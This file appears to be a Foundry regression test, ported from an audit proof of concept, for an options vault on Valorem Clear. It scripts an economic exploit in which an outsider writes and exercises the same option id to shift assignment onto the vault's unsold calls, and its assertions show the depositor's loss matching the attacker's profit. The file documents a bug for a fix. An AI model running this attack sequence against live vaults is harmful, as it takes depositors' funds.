// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseTest} from "../Base.t.sol";
import {RealClearBase} from "../helpers/RealClearBase.sol";
import {IValoremClear} from "../../src/interfaces/IValoremClear.sol";
import {OrderComponents} from "../../src/interfaces/ISeaport.sol";

/// @title AF-01 regression: a third party takes the in-the-money value of the vault's UNSOLD calls
/// @notice Ported from the audit PoC `PoC_unsold_inventory_third_party_assignment.t.sol` (AUDIT-FINDINGS
///         F-01, High). BUG-PRESENT FORM: the assertions below demonstrate the loss on today's code.
///         Stage C-06A (write on fill) inverts the final assertions: under A(ii) the vault never holds
///         unsold option tokens, so `assigned <= written == sold` and alice's USD equals the baseline.
/// @dev Runs against the REAL Valorem Clear bytecode (6436c82) via {RealClearBase}: the loss lives in
///      Valorem's bucket engine, and the mock that models it is itself under test elsewhere
///      (test/unit/MockClearDiff.t.sol), so a regression that asserts a USDG figure must not depend on it.
///
///      Setup mirrors the launch market: lot 1e18, 231 USDG strike, spot 220 -> 260 (in the money in the
///      24h exercise window). The vault writes 20 and sells 5 on Seaport, so 15 stay UNSOLD, which is an
///      ordinary partly-filled week. Upstream `write` checks only `expiry > now`, so before any exercise
///      Mallory writes 200 of the SAME option id into bucket 0, then exercises her 200: assignment is
///      pro rata by amount WRITTEN across the bucket, so the vault (20 of 220) is assigned ~18.64
///      contracts and delivers ~13.64 NVDA at 231 that are worth 260, with no premium behind them.
contract AF01_UnsoldInventory is BaseTest, RealClearBase {
    address internal mallory = makeAddr("mallory");

    int256 internal constant SPOT_ITM = 260_00000000;
    uint256 internal constant SPOT_ITM_USDG = 260_000_000;
    /// @dev (260 - 231) x (205 x 20 / 220 - 5) = 29 x 13.6363... = 395.4545 USDG.
    uint256 internal constant EXPECTED_LOSS_USDG = 395_454_545;

    function _deployClear() internal override returns (IValoremClear) {
        return _deployRealClear();
    }

    function setUp() public override {
        super.setUp();
        // Attacker capital. Both legs round-trip: the collateral comes back at expiry and the strike
        // USDG buys NVDA worth more than it cost.
        _fund(mallory, 300e18, 100_000_000_000);
        _fund(buyer, 0, 5_000_000_000); // $10,000 total, enough to exercise 5 at 231
    }

    function test_thirdPartySteals_ITM_value_of_unsold_inventory() public {
        // --- open the cycle: write 20, sell 5, keep 15 UNSOLD ---
        _deposit(alice, 30e18);
        uint256 optionId = optionIds[RUNG_PICK]; // 231 rung, in band at spot 220
        vm.prank(keeper);
        vault.rollOpen(optionId, 20);

        OrderComponents memory order = _approveListing(optionId, 20, _okUnitPrice()); // $2 / contract
        _fill(order, 5); // only 5 of 20 sell

        assertEq(vault.contractsRemaining(), 15, "15 contracts unsold");
        assertEq(vault.contractsWritten(), 20, "vault wrote 20");

        // --- rally into the money and open the exercise window ---
        feed.setAnswer(SPOT_ITM);
        vm.warp(exerciseTs);

        uint256 snap = vm.snapshotState();

        // ================= BASELINE: honest week, buyer exercises the 5 it bought =================
        _exercise(optionId, 5);
        vm.warp(expiryTs);
        _rollClose();
        uint256 aliceBaseline = _aliceRecoverableUsd();

        // ================= ATTACK ==================================================================
        vm.revertToState(snap);

        uint256 malloryNvda0 = nvda.balanceOf(mallory);
        uint256 malloryUsdg0 = usdg.balanceOf(mallory);

        // (1) Mallory writes 200 of the SAME option id directly on Valorem. Bucket 0 is still
        //     unexercised, so her writes join the vault's bucket.
        vm.startPrank(mallory);
        nvda.approve(address(clear), type(uint256).max);
        usdg.approve(address(clear), type(uint256).max);
        uint256 malloryClaim = clear.write(optionId, 200);
        vm.stopPrank();

        // (2) The buyer exercises its 5 and Mallory her 200. Everything lands on the single bucket
        //     and is split pro rata by amount WRITTEN.
        _exercise(optionId, 5);
        vm.prank(mallory);
        clear.exercise(optionId, 200);

        uint256 vaultAssigned = vault.contractsAssigned();
        emit log_named_uint("vault contracts assigned (attack)", vaultAssigned);
        // BUG PRESENT: the vault is assigned far more than the 5 it sold (18 = floor(205 x 20 / 220)).
        assertEq(vaultAssigned, 18, "vault assigned 18 of its 20, having sold 5");

        // (3) Expiry: everyone redeems.
        vm.warp(expiryTs);
        vm.prank(mallory);
        clear.redeem(malloryClaim);
        _rollClose();

        uint256 aliceAttack = _aliceRecoverableUsd();

        int256 malloryProfitUsd = _valueUsd(
            int256(nvda.balanceOf(mallory)) - int256(malloryNvda0),
            int256(usdg.balanceOf(mallory)) - int256(malloryUsdg0)
        );

        emit log_named_uint("alice recoverable USD, baseline (6dp)", aliceBaseline);
        emit log_named_uint("alice recoverable USD, attack   (6dp)", aliceAttack);
        emit log_named_int("mallory profit USD (6dp)", malloryProfitUsd);

        // BUG PRESENT, the two things that make this a theft rather than market noise:
        // A) the attack strictly harms the depositor versus the honest baseline;
        assertLt(aliceAttack, aliceBaseline, "attack leaves alice strictly worse off");
        // B) Mallory walks away with a riskless profit that equals the depositor's loss.
        assertGt(malloryProfitUsd, 0, "mallory profits with zero market risk");
        uint256 depositorLoss = aliceBaseline - aliceAttack;
        assertApproxEqAbs(depositorLoss, EXPECTED_LOSS_USDG, 10_000, "loss = (spot - strike) x (assigned - sold)");
        assertApproxEqAbs(uint256(malloryProfitUsd), depositorLoss, 5_000_000, "mallory's gain ~= depositor's loss");
    }

    /*//////////////////////////////////////////////////////////////
                                HELPERS
    //////////////////////////////////////////////////////////////*/

    /// @dev What alice can actually get out once the vault is Idle: redeem all shares for NVDA
    ///      (valued at the ITM spot) plus claim all accrued USDG. In USDG base units (6dp).
    function _aliceRecoverableUsd() internal returns (uint256) {
        require(vault.canRedeemInstantly(), "expected Idle/flat after rollClose");
        uint256 usdgOut;
        if (vault.claimableUsdg(alice) != 0) {
            vm.prank(alice);
            usdgOut = vault.claimUsdg();
        }
        uint256 shares = vault.balanceOf(alice);
        uint256 assetsOut;
        if (shares != 0) {
            vm.prank(alice);
            assetsOut = vault.redeem(shares, alice, alice);
        }
        return (assetsOut * SPOT_ITM_USDG) / 1e18 + usdgOut;
    }

    function _valueUsd(int256 dNvda, int256 dUsdg) internal pure returns (int256) {
        return (dNvda * int256(SPOT_ITM_USDG)) / int256(1e18) + dUsdg;
    }
}
